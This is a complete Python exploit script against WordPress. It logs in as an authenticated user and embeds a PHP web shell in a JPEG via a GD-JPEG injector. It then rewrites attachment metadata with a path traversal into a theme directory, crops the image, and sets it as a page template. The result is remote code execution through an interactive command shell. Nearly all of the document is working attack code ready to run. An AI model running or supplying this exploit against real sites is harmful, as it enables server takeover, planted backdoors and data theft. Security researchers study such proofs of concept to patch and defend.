import requests
import re
import sys
import os
from datetime import datetime

URL = re.sub("/$", "", sys.argv[1])
IMG = ""
IMG_H = 0
IMG_W = 0
s = requests.session()
date = f"{datetime.now():%Y}/{datetime.now():%m}/"


def write_byte(byte_content, file_name):
    with open(f"{file_name}", "wb") as file:
        file.write(byte_content)


def init_load_img():
    from PIL import Image
    print("Loading image...")

    IMG_PATH = sys.argv[5]

    global IMG, IMG_W, IMG_H
    IMG_W, IMG_H = Image.open(IMG_PATH).size
    IMG = "_" + os.path.basename(IMG_PATH)

    file = open(IMG_PATH, "rb").read()
    if b"<?" in file:
        file.replace(b"<?", b"<<")

    write_byte(file, IMG)
    inject_img(IMG)

    print("Success\n\n")


def inject_img(img_path):
    print("Injecting image...")

    from gd_jpeg import api
    global IMG
    IMG = "injected-" + os.path.basename(img_path)

    api(img_path, "<?=`$_GET[0]`?>MF(#-f", IMG)


def load_img_loop():
    global IMG
    lfi()
    res = s.get(URL, params={"p": rce()})
    with open(f"cropped-{IMG}", "wb") as file:
        file.write(res.content)

    IMG = f"cropped-{IMG}"
    inject_img(IMG)


def get_nonce(path, params=None, regex=None):
    res = s.get(URL + path, params=params)
    if regex is None:
        return re.findall(r'name="_wpnonce" value="(\w+)"', res.text)[0]
    else:
        return re.findall(regex, res.text)[0]


def login():
    print("Logging in...")

    data = {
        "log": sys.argv[3],
        "pwd": sys.argv[4],
        "wp-submit": "Log In"
    }
    res = s.post(URL + "/wp-login.php", data)

    if res.status_code == 200:
        print("Success\n\n")
    else:
        exit(f"Login failed with HTTP code: {res.status_code}")


def upload_image():
    print("Uploading...")
    global IMG
    data = {
        'name': IMG,
        'action': 'upload-attachment',
        '_wpnonce': get_nonce("/wp-admin/media-new.php")
    }

    image = {'async-upload': (IMG, open(IMG, 'rb'))}
    res = s.post(URL + "/wp-admin/async-upload.php", data=data, files=image)

    if res.status_code == 200:
        res_json = res.json()
        IMG = res_json["data"]["filename"]
        print(f"Image name: {IMG}")

        img_id = res_json["data"]["id"]
        print(f"Image id: {img_id}\nSuccess\n\n")
        return img_id
    else:
        exit(f"Upload image failed with HTTP code: {res.status_code}")


def change_postmeta(post_id, key, value, _wpnonce=None):
    print(f"Changing {key} of {post_id} to {value}")

    if _wpnonce is None:
        _wpnonce = get_nonce("/wp-admin/post.php", {"post": post_id, "action": "edit"})

    data = {
        '_wpnonce': _wpnonce,
        'action': 'editpost',
        'post_ID': post_id,
        f'meta_input[{key}]': value
    }
    res = s.post(URL + "/wp-admin/post.php", data)

    if res.status_code == 200:
        print(f"Success\n\n")
    else:
        exit(f"Failed to change {key} with HTTP code: {res.status_code}")


def crop(img_id):
    print("Cropping...")

    data = {
        'action': 'crop-image',
        '_ajax_nonce': get_nonce("/wp-admin/post.php", {"post": img_id, "action": "edit"},
                                 r"\"(\w+)\" \)' class='button' value='Edit Image'"),
        'id': img_id,
        'cropDetails[x1]': 0,
        'cropDetails[y1]': 0,
        'cropDetails[width]': IMG_W,
        'cropDetails[height]': IMG_H,
        'cropDetails[dst_width]': IMG_W,
        'cropDetails[dst_height]': IMG_H
    }
    res = s.post(URL + "/wp-admin/admin-ajax.php", data)
    if res.status_code == 200:
        print(f"Success\n\n")
    else:
        exit(f"Failed to crop HTTP code: {res.status_code}")


def new_post():
    print("Creating new post...")

    res = s.post(URL + "/wp-admin/post-new.php")
    if res.status_code == 200:
        print(f"Success\n\n")
        _wpnonce = re.findall(r'name="_wpnonce" value="(\w+)"', res.text)[0]
        post_id = re.findall(r'"post":{"id":(\w+),', res.text)[0]
        return post_id, _wpnonce
    else:
        exit(f"Failed to create new post with HTTP code: {res.status_code}")


def shell_exec(post_id, cmd):
    res = s.get(URL, params={"p": post_id, "0": cmd})
    return re.findall(rb"\x00\x02\x11\x03\x11\x00\x3F\x00(.*)MF\(#-f", res.content, flags=re.DOTALL)[0].decode()


def shell(post_id):
    print("RCE: ")
    cmd = ""
    while cmd != "exit":
        cmd = input("$ ").strip()
        print(shell_exec(post_id, cmd))


def check_img_location(img_id):
    res = s.get(f"http://localhost/wp-admin/post.php?post={img_id}&action=edit").text
    if f"/../../../../themes/" not in re.findall(r'id="attachment_url" value="(.*)"', res)[0]:
        exit("Failed to change _wp_attached_file, please check Wordpress version")


def lfi():
    img_id = upload_image()
    change_postmeta(img_id, "_wp_attached_file", f"{date}{IMG}?/../../../../themes/{sys.argv[2]}/{IMG}")
    check_img_location(img_id)
    crop(img_id)


def rce():
    post_id, _wpnonce = new_post()
    change_postmeta(post_id, "_wp_page_template", f"cropped-{IMG}", _wpnonce)
    return post_id


def test_poc(post_id):
    print("Testing PoC")
    if shell_exec(post_id, "echo h3!!o_vv0rld") != "h3!!o_vv0rld\n":
        exit("PoC failed")


def main():
    print(f"URL: {URL}")
    login()

    init_load_img()
    for i in range(2):
        load_img_loop()

    lfi()
    post_id = rce()

    test_poc(post_id)

    print(f"PoC: {URL}/?p={post_id}&0=ls")
    shell(post_id)


if __name__ == "__main__":
    main()
